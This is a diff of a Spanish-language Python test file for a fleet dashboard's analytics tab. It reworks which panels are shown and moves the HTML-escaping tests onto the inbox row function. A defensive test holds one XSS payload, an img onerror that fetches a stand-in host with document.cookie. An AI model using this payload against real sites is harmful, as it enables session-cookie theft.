@@ -8,9 +8,9 @@ campo **aparezca** en el JS. Eso es el piso, y pasa con la función entera
 desconectada: un `flotaAnLecturas` que nadie llama sigue nombrando
 `lecturas_por_vehiculo`. Acá se corre el archivo real y se mira lo pintado.
 
-## La propiedad que este archivo protege, y es la contraria a la del bloque de salud
+## La propiedad que este archivo protege, y es la contraria a la de Pendientes
 
-`flotaBloqueSalud` devuelve vacío cuando no hay nada que hacer. La analítica
+Pendientes (la bandeja) no muestra nada cuando no hay nada que hacer. La analítica
 **tiene que pintar los seis vehículos aunque no haya un solo dato**, porque el
 trabajo entero del tab es mostrar lo que todavía no se puede medir. Un panel que
 desaparece por estar vacío es indistinguible de uno que nunca se escribió.
@@ -179,8 +179,8 @@ class TestLosTresPanelesPintanConLaBaseVacia:
         assert 'Lo que la ficha no dice' in html
 
     def test_ningun_panel_desaparece_por_estar_vacio(self, tmp_path):
-        """La disciplina contraria a la de `flotaBloqueSalud`, y va probada
-        porque es la que alguien va a «corregir» por parecerle ruidosa."""
+        """La disciplina contraria a la de Pendientes, y va probada porque es
+        la que alguien va a «corregir» por parecerle ruidosa."""
         html = _correr(tmp_path, _hoy_real(
             lecturas_por_vehiculo=[], cobertura_por_vehiculo=[]))['html']
         assert 'Esperando el primer registro' in html
@@ -389,6 +389,10 @@ class TestElIndicadorDeHallazgosVaDespromediado:
             motivo='ningún hallazgo cerrado todavía: no hay duración que '
                    'promediar. El indicador nace al cerrar el primer daño '
                    'con su odómetro y su evidencia.')))['html']
+        # Solo el panel de hallazgos: el diagnóstico técnico dice «en 30 días»
+        # en otro lado, y buscar en todo el tab mediría otra cosa.
+        html = html[html.index('tabla-titulo">Días de daño abierto'):]
+        html = html[:html.index('Diagnóstico técnico')]
         assert 'sin dato' in html
         assert 'ningún hallazgo cerrado todavía' in html
         assert '0 días' not in html
@@ -631,12 +635,14 @@ class TestElTabCompletoConDatosDeVerdad:
     coherente: verifican cada etapa con datos que ellos mismos fabricaron.
     """
 
-    #: Los quince bloques que el tab tiene que pintar SIEMPRE, con o sin datos.
+    #: Los bloques que el tab tiene que pintar SIEMPRE, con o sin datos. Desde el
+    #: 2026-09-24 Analítica es solo lo que no es accionable del día: «El
+    #: recorrido de la semana», «Inspección diaria», «Papeles» y «Custodia»
+    #: repetían la bandeja (Hoy y Pendientes, con placa y botón) y se retiraron;
+    #: la calidad del kilómetro y lo que la ficha no dice viven en el
+    #: Diagnóstico técnico plegado.
     TITULOS = [
         'De dónde salen estos números',
-        'El recorrido de la semana',
-        'Calidad del kilómetro',
-        'Lo que la ficha no dice',
         'Costo por kilómetro',
         'Pesos por mes',
         'Rendimiento km/galón',
@@ -644,22 +650,31 @@ class TestElTabCompletoConDatosDeVerdad:
         'Vida de llanta por posición',
         'Plan preventivo',
         'Ritmo de uso',
-        'Días de hallazgo abierto',
-        'Inspección diaria',
-        'Papeles',
-        'Custodia',
+        'Días de daño abierto',
+        'Diagnóstico técnico',
+        'Calidad del kilómetro',
+        'Lo que la ficha no dice',
     ]
 
-    def test_los_quince_paneles_pintan_con_datos(self, tmp_path):
+    #: Lo que repetía la bandeja y ya NO puede volver a Analítica.
+    RETIRADOS = ['El recorrido de la semana', 'Inspección diaria',
+                 'tabla-titulo">Papeles<', 'tabla-titulo">Custodia<',
+                 'Salud de la flota']
+
+    def test_lo_que_repite_la_bandeja_no_vuelve(self, tmp_path):
+        html = _correr(tmp_path, _lleno())['html']
+        assert not [t for t in self.RETIRADOS if t in html]
+
+    def test_los_paneles_pintan_con_datos(self, tmp_path):
         html = _correr(tmp_path, _lleno())['html']
         faltan = [t for t in self.TITULOS if t not in html]
         assert not faltan, f'no pintaron: {faltan}'
 
-    def test_los_quince_paneles_pintan_TAMBIEN_vacios(self, tmp_path):
+    def test_los_paneles_pintan_TAMBIEN_vacios(self, tmp_path):
         """La decisión del dueño —tab completo— probada en el estado de hoy.
 
-        `flotaBloqueSalud` devuelve vacío cuando no hay nada que hacer; acá es
-        al revés y va probado, porque es la disciplina que alguien va a
+        Pendientes (la bandeja) no muestra nada cuando no hay nada que hacer;
+        acá es al revés y va probado, porque es la disciplina que alguien va a
         «corregir» por parecerle ruidosa.
         """
         html = _correr(tmp_path, {})['html']
@@ -671,18 +686,22 @@ class TestElTabCompletoConDatosDeVerdad:
         for basura in ('NaN', 'undefined', '[object Object]'):
             assert basura not in html, f'el tablero pintó {basura!r}'
 
-    def test_el_orden_pone_el_kilometro_antes_que_la_plata(self, tmp_path):
-        """No es temático: mientras la calidad del kilómetro esté en rojo, el
-        CPK y el km por llanta salen `sin_dato` por diseño. El panel que dice
-        qué hacer va antes que los que dependen de que se haga."""
+    def test_el_orden_pone_primero_lo_que_decide_plata(self, tmp_path):
+        """2026-09-24: lo que decide plata primero (CPK, pesos por mes,
+        rendimiento), después taller, llantas, preventivo, ritmo y días de daño
+        abierto; lo técnico —la calidad del kilómetro, lo que la ficha no dice—
+        plegado al final, para quien mantiene el dato. Lo que dice qué hacer
+        HOY está en Pendientes, no acá."""
         html = _correr(tmp_path, _lleno())['html']
-        # Por título de panel y no por texto suelto: «El recorrido de la semana»
-        # NOMBRA a los paneles para decir dónde viven, así que un `index()` sobre
-        # la palabra encuentra primero el índice y el test mediría otra cosa.
+
         def panel(t):
             return html.index(f'tabla-titulo">{t}')
-        assert panel('Calidad del kilómetro') < panel('Costo por kilómetro')
-        assert panel('Lo que la ficha no dice') < panel('Vida de llanta')
+        orden = [panel('Costo por kilómetro'), panel('Pesos por mes'),
+                 panel('Rendimiento km/galón'), panel('Taller y garantía'),
+                 panel('Vida de llanta'), panel('Plan preventivo'),
+                 panel('Ritmo de uso'), panel('Días de daño abierto'),
+                 html.index('Diagnóstico técnico'), panel('Calidad del kilómetro')]
+        assert orden == sorted(orden), orden
 
     def test_el_CPK_muestra_la_division_que_lo_produjo(self, tmp_path):
         """Un CPK suelto no se puede auditar, y éste va a la pantalla de quien
@@ -793,190 +812,9 @@ class TestElPanelDePesosPorMes:
         assert bloque.index('ZZZ999') < bloque.index('AAA111')
 
 
-class TestLosContadoresDicenAQuienLlamar:
-    """Papeles y Custodia eran cifras sin placa, y son **dos de las cinco
-    señales con las que se mide a control de flota**.
-
-    «2 documentos vencidos» no es accionable y su ficha describe el trabajo como
-    *«persigue lo vencido»*: para saber a cuál, había que abrir los seis
-    expedientes. Es el criterio 1 de este archivo —«ninguna cifra sin su
-    enumeración al lado»— incumplido justo donde más se nota.
-    """
-
-    def test_papeles_nombra_la_placa_y_el_documento(self, tmp_path):
-        html = _correr(tmp_path, _lleno())['html']
-        bloque = html[html.index('tabla-titulo">Papeles<'):][:2500]
-        assert 'THP696' in bloque and 'soat' in bloque
-        assert 'venció hace 15 día(s)' in bloque
-
-    def test_el_signo_separa_sacar_la_cita_de_bajar_el_camion(self, tmp_path):
-        """Los dos se atienden distinto y se leen en el mismo renglón. Un
-        «faltan 16 días» y un «venció hace 15» con el mismo formato producen la
-        misma reacción, que es la equivocada para uno de los dos."""
-        bloque = _correr(tmp_path, _lleno())['html']
-        bloque = bloque[bloque.index('tabla-titulo">Papeles<'):][:2500]
-        assert 'vence en 16 día(s)' in bloque
-        assert 'venció hace' in bloque
-
-    def test_el_papel_sin_cargar_no_finge_una_fecha(self, tmp_path):
-        """`vence: None` no es «vence hoy» ni «no vence»: es que no hay fecha
-        que juzgar. La base lo impone —un `no_encontrado` no puede llevar
-        vencimiento— y la pantalla no puede contradecirla."""
-        bloque = _correr(tmp_path, _lleno())['html']
-        bloque = bloque[bloque.index('tabla-titulo">Papeles<'):][:2500]
-        assert 'poliza_rc — nadie lo ha podido mostrar' in bloque
-        assert 'NaN' not in bloque and 'null' not in bloque
-
-    def test_custodia_dice_placa_dia_y_QUE_mitad_falta(self, tmp_path):
-        """«Faltan las de inicio» y «faltan las de cierre» se arreglan hablando
-        con personas distintas y en momentos distintos del día."""
-        bloque = _correr(tmp_path, _lleno())['html']
-        bloque = bloque[bloque.index('tabla-titulo">Custodia<'):][:2500]
-        assert 'THP696' in bloque and '2026-09-01' in bloque
-        assert 'faltan fotos de fin (2 de 11)' in bloque
-        assert 'faltan fotos de inicio (7 de 13)' in bloque
-
-    def test_el_cierre_forzado_publica_su_motivo(self, tmp_path):
-        """Un forzado sin motivo sería un cierre anónimo. La base lo prohíbe con
-        un CHECK; la pantalla lo muestra, que es lo que lo hace útil."""
-        bloque = _correr(tmp_path, _lleno())['html']
-        bloque = bloque[bloque.index('tabla-titulo">Custodia<'):][:2500]
-        assert 'el conductor no volvió a la sede' in bloque
-
-    def test_sin_nada_pendiente_lo_DICE_en_vez_de_dejar_un_hueco(self, tmp_path):
-        """La lista vacía no es un `return ''`. Un panel con tres ceros y nada
-        debajo es indistinguible de uno cuya enumeración se rompió."""
-        d = _lleno()
-        d.update(documentos_por_vehiculo=[], custodias_por_vehiculo=[])
-        html = _correr(tmp_path, d)['html']
-        assert 'Ningún documento vencido' in html
-        assert 'Ningún turno cerrado a la fuerza' in html
-
-    def test_sin_la_tabla_no_repite_lo_que_el_panel_ya_dijo(self, tmp_path):
-        """`null` es «la tabla no existe», y el panel entero ya lo declaró
-        arriba con su gesto. Decirlo dos veces con otras palabras es cómo un
-        renglón deja de leerse."""
-        html = _correr(tmp_path, {})['html']
-        assert 'Ningún documento vencido' not in html
-        assert 'La tabla de documentos todavía no existe' in html
-
-
-class TestElRecorridoDeLaSemana:
-    """El índice que existe porque el orden de los paneles es de dependencia.
-
-    Cuatro de las cinco señales del rol viven en los paneles 11, 13 y 14 de 15 —
-    arriba está lo que todavía no se puede medir. El orden de abajo no está mal
-    y no se toca: es un orden para quien construye. Este bloque es el de quien
-    opera, y es lo único del tab que se lee de arriba a abajo en 30 segundos.
-    """
-
-    def test_las_cinco_senales_estan_y_nombran_su_panel(self, tmp_path):
-        html = _correr(tmp_path, _lleno())['html']
-        bloque = html[html.index('El recorrido de la semana'):][:2200]
-        for señal in ('Fichas técnicas sin completar',
-                      'Daños que pasaron su fecha límite',
-                      'Documentos vencidos', 'Turnos cerrados a la fuerza',
-                      'Custodias sin las fotos completas'):
-            assert señal in bloque, señal
-        for panel in ('Lo que la ficha no dice', 'Días de hallazgo abierto',
-                      'Papeles', 'Custodia'):
-            assert panel in bloque, f'no dice dónde vive: {panel}'
-
-    def test_va_ARRIBA_de_los_paneles_que_indexa(self, tmp_path):
-        """Un índice después del contenido no es un índice."""
-        html = _correr(tmp_path, _lleno())['html']
-        assert (html.index('El recorrido de la semana')
-                < html.index('tabla-titulo">Papeles<'))
-        assert (html.index('El recorrido de la semana')
-                < html.index('Días de hallazgo abierto'))
-
-    def test_el_numero_del_indice_ES_el_del_panel(self, tmp_path):
-        """La objeción obvia al índice: dos sitios que dicen el mismo número
-        terminan diciendo dos. Acá no pueden — los dos leen el mismo `h` en el
-        mismo render— y va probado, porque es la propiedad que lo hace legítimo.
-        """
-        d = _lleno()
-        d['documentos_vencidos'] = 7
-        html = _correr(tmp_path, d)['html']
-        indice = html[html.index('El recorrido de la semana'):][:2200]
-        panel = html[html.index('tabla-titulo">Papeles<'):][:2500]
-        assert '>7<' in indice and '>7<' in panel
-
-    def test_las_fichas_van_al_REVES_y_el_color_no_miente(self, tmp_path):
-        """`fichas_completas` crece cuando el trabajo avanza; las otras cuatro
-        crecen cuando empeora. Publicar «4» en rojo junto a «1 documento
-        vencido» en rojo diría que las dos son malas noticias."""
-        d = _lleno()
-        d['cobertura_por_vehiculo'] = [
-            dict(f, ficha_completa=True) for f in d['cobertura_por_vehiculo']]
-        bloque = _correr(tmp_path, d)['html']
-        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
-        i = bloque.index('Fichas técnicas sin completar')
-        assert 'var(--red)' not in bloque[i:i + 400], (
-            'con todas las fichas completas no falta ninguna: no puede ir en rojo')
-
-    def test_las_fichas_NO_salen_de_restar_dos_denominadores(self, tmp_path):
-        """El defecto que tuvo este renglón durante su primera versión.
-
-        Se calculaba `vehiculos_activos - fichas_completas`. Los dos números
-        existen y el health los publica, pero **no comparten denominador**:
-        `fichas_completas` cuenta fichas completas de TODOS los vehículos y
-        `vehiculos_activos` solo los activos. Un vehículo dado de baja con su
-        ficha completa hacía la resta negativa, y el índice publicaba
-        «-1 fichas técnicas sin completar».
-
-        Se cuenta de `cobertura_por_vehiculo`, que es la misma lista que pinta
-        el panel al que este renglón manda. Una fuente, no dos.
-        """
-        d = _lleno()
-        # El escenario exacto: dos activos, y el health reportando más fichas
-        # completas que vehículos activos.
-        d['cobertura_por_vehiculo'] = [
-            dict(d['cobertura_por_vehiculo'][0], placa='AAA111', ficha_completa=True),
-            dict(d['cobertura_por_vehiculo'][0], placa='BBB222', ficha_completa=True),
-        ]
-        d.update(vehiculos_activos=2, fichas_completas=5)
-        bloque = _correr(tmp_path, d)['html']
-        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
-        i = bloque.index('Fichas técnicas sin completar')
-        renglon = bloque[i:i + 400]
-        assert '>-' not in renglon, f'publicó un negativo: {renglon[:200]}'
-        assert '>0<' in renglon, 'las dos activas tienen ficha completa'
-
-    def test_los_danos_vencidos_salen_del_campo_y_no_de_un_recuento(self, tmp_path):
-        """`dias_hallazgo_abierto.n_vencidos` lo calcula el dominio sobre los
-        hallazgos que ENTRAN al indicador. Recontarlo en el cliente filtrando
-        `casos` daba el mismo número solo porque los casos que no entran no
-        traen la clave `vencido` — un acuerdo tácito con el serializador.
-
-        Se afirma leyendo el campo: si el índice recontara, un `n_vencidos`
-        distinto de la suma de banderas lo delataría.
-        """
-        d = _lleno()
-        dhc = dict(d['dias_hallazgo_abierto'])
-        dhc['n_vencidos'] = 9
-        d['dias_hallazgo_abierto'] = dhc
-        bloque = _correr(tmp_path, d)['html']
-        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
-        i = bloque.index('Daños que pasaron su fecha límite')
-        assert '>9<' in bloque[i:i + 400]
-
-    def test_un_null_dice_sin_dato_y_NO_cero(self, tmp_path):
-        """«No se pudo mirar» y «no hay nada» autorizan cosas distintas: el
-        segundo permite no hacer nada, el primero no."""
-        bloque = _correr(tmp_path, {})['html']
-        bloque = bloque[bloque.index('El recorrido de la semana'):][:2200]
-        assert bloque.count('sin dato') == 5, 'con la base vacía las cinco lo son'
-        assert '>0<' not in bloque
-
-    def test_le_dice_a_gestion_que_esta_no_es_su_pantalla(self, tmp_path):
-        """Cuatro roles ven este tab y solo dos tienen decisión asignada. Un rol
-        que abre un tablero, no encuentra nada que decidir y nadie le dijo que
-        era así, deja de abrirlo — y arrastra al tablero
-        (`gestion-gerente.md:29`)."""
-        html = _correr(tmp_path, _lleno())['html']
-        bloque = html[html.index('El recorrido de la semana'):][:2500]
-        assert 'Pesos por mes' in bloque and 'Costo por kilómetro' in bloque
+# «Papeles» y «Custodia» (con placa) y «El recorrido de la semana» se
+# retiraron de Analítica el 2026-09-24: repetían la bandeja, que los lista con
+# placa y botón en Pendientes (`tests/flota/test_bandeja.py::TestPendientes`).
 
 
 class TestNingunPanelPublicaBasuraConAutoridad:
@@ -1017,29 +855,24 @@ class TestElTextoDelConductorNoEjecutaNadaEnLaPantallaDeGestion:
     """El camino de escalada, cerrado y probado ejecutando el render.
 
     `POST /flota/custodia/traspaso` es `LECTURA_FLOTA`: **el conductor escribe**
-    el motivo de un cierre forzado. Ese texto lo pinta el panel de Custodia, que
-    solo ven gestión y control de flota. Es el rol con menos permisos del módulo
-    escribiendo en la sesión de los que más tienen.
+    el motivo de un cierre forzado. Ese texto lo pinta Pendientes de la bandeja
+    (antes, el panel de Custodia de Analítica), que solo ven gestión y control
+    de flota. Es el rol con menos permisos escribiendo en la sesión de los que
+    más tienen.
 
-    Se prueba con `esc()` **de verdad** —el arnés carga `util.js`, no lo
-    stubbea— y mirando el DOM resultante, no grepeando el fuente. Un
-    `flotaAnTextoCustodia` que dejara de llamar a `esc` seguiría nombrando el
-    campo y pasaría cualquier test de texto.
+    Se prueba con `esc()` **de verdad** —el arnés carga `util.js`— y mirando lo
+    pintado por `flotaBandejaFilaPendiente`, no grepeando el fuente.
     """
 
     CARGA = '<img src=x onerror="fetch(\'//malo?c=\'+document.cookie)">'
 
     def _con_motivo(self, tmp_path, motivo):
-        d = _lleno()
-        d['custodias_por_vehiculo'] = [{
-            'placa': 'THP696', 'custodia_id': 4,
-            'inicio_ts': '2026-09-01T05:10:00', 'fin_ts': '2026-09-01T18:20:00',
-            'abierta': False, 'cierre_forzado': True,
-            'cierre_forzado_motivo': motivo, 'sin_foto_completa': False,
-            'mitad_incompleta': None, 'fotos': None, 'fotos_exigidas': None,
-            'base': 'custodias registradas contra el vehículo',
-            'etiqueta': 'toda la historia registrada'}]
-        return _correr(tmp_path, d)['html']
+        p = {'clase': 'cierre_forzado', 'placa': 'THP696', 'urgencia': 'ambar',
+             'texto': 'turno de Ana cerrado a la fuerza por Jefa hoy a las 06:00',
+             'detalle': f'Motivo: {motivo}. Sin fotos de cierre.',
+             'accion': {'tipo': 'fotos_turno', 'custodia_id': 4}}
+        return _correr(tmp_path, {}, fn='flotaBandejaFilaPendiente',
+                       args=[p, 0, False])['devuelto']
 
     def test_el_markup_inyectado_no_llega_vivo_al_DOM(self, tmp_path):
         html = self._con_motivo(tmp_path, self.CARGA)
@@ -1048,15 +881,12 @@ class TestElTextoDelConductorNoEjecutaNadaEnLaPantallaDeGestion:
             'pantalla de gestión')
 
     def test_pero_el_texto_SI_se_ve(self, tmp_path):
-        """Escapar no es esconder. El motivo es la información: quien mira el
-        tablero necesita leer qué escribió el conductor, aunque sea basura —
-        sobre todo si es basura."""
+        """Escapar no es esconder: quien mira necesita leer qué escribió el
+        conductor, aunque sea basura."""
         html = self._con_motivo(tmp_path, self.CARGA)
         assert '&lt;img src=x onerror' in html
 
     def test_un_motivo_normal_se_lee_igual_que_antes(self, tmp_path):
-        """La otra dirección: un escapado que rompa el texto corriente hace que
-        alguien lo quite en seis meses «porque se ve mal»."""
         html = self._con_motivo(tmp_path, 'el conductor no volvió a la sede')
         assert 'el conductor no volvió a la sede' in html
 
@@ -1067,28 +897,21 @@ class TestElTextoDelConductorNoEjecutaNadaEnLaPantallaDeGestion:
 
 
 class TestEscConvierteYNoDecide:
-    """`esc()` a solas. Va acá y no en un archivo aparte porque este arnés ya
-    carga `util.js` de verdad."""
+    """`esc()` a solas, con el `util.js` real que carga este arnés."""
 
     def _esc(self, tmp_path, valor):
-        """Corre el `esc` real y devuelve lo que produce."""
-        d = _lleno()
-        d['custodias_por_vehiculo'] = [{
-            'placa': valor, 'custodia_id': 1, 'inicio_ts': None, 'fin_ts': None,
-            'abierta': True, 'cierre_forzado': True,
-            'cierre_forzado_motivo': 'x', 'sin_foto_completa': False,
-            'mitad_incompleta': None, 'fotos': None, 'fotos_exigidas': None,
-            'base': 'b', 'etiqueta': 'e'}]
-        return _correr(tmp_path, d)['html']
+        p = {'clase': 'ficha', 'placa': valor, 'urgencia': 'ambar', 'texto': 't',
+             'detalle': 'd', 'accion': {'tipo': 'expediente', 'pestana': 'ficha'}}
+        return _correr(tmp_path, {}, fn='flotaBandejaFilaPendiente',
+                       args=[p, 0, False])['devuelto']
 
     def test_escapa_los_cinco_caracteres(self, tmp_path):
         html = self._esc(tmp_path, '<&>"\'')
         assert '&lt;&amp;&gt;&quot;&#39;' in html
 
     def test_un_null_sigue_viendose_null_y_no_vacio(self, tmp_path):
-        """`String(v)` y no un default a `\'\'`: reproduce lo que hacía el
-        literal de plantilla, para que el cambio mueva UNA cosa. Convertir los
-        nulos en vacío es una decisión de producto distinta, y en este repo
-        esconder un hueco tiene historial."""
+        """`String(v)` y no un default a `\'\'`: convertir los nulos en vacío es
+        una decisión de producto distinta, y en este repo esconder un hueco
+        tiene historial."""
         html = self._esc(tmp_path, None)
         assert '<b>null</b>' in html
